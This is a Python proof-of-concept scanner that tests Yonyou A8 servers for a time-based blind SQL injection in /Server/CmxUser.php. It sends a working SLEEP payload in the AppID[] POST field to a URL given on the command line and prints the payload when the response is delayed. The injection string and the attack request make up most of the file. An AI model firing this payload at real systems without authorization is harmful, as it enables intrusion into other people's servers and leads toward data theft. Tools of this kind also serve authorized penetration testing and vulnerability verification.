#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 用友优普a8 CmxUserSQL时间盲注入
referer: http://www.wooyun.org/bugs/wooyun-2015-0157215
author: Lucifer
description: 文件/Server/CmxUser.php中,post参数AppID存在SQL注入。
'''
import sys
import json
import time
import requests



class yonyou_a8_CmxUser_sqli_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        post_data = {
            "UserName":"test",
            "AppID[]":"0 AnD(SeLeCt*FrOm(SeLeCt(SlEeP(6)))PyGh)"
        }
        payload = "/Server/CmxUser.php?pgid=AddUser_Step4"
        vulnurl = self.url + payload
        start_time = time.time()
        try:
            req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
            if time.time() - start_time >= 6:
                return "[+]存在用友优普a8 CmxUserSQL时间盲注入漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4)

        except:
            return "[-]connect timeout"

if __name__ == "__main__":

    testVuln = yonyou_a8_CmxUser_sqli_BaseVerify(sys.argv[1])
    testVuln.run()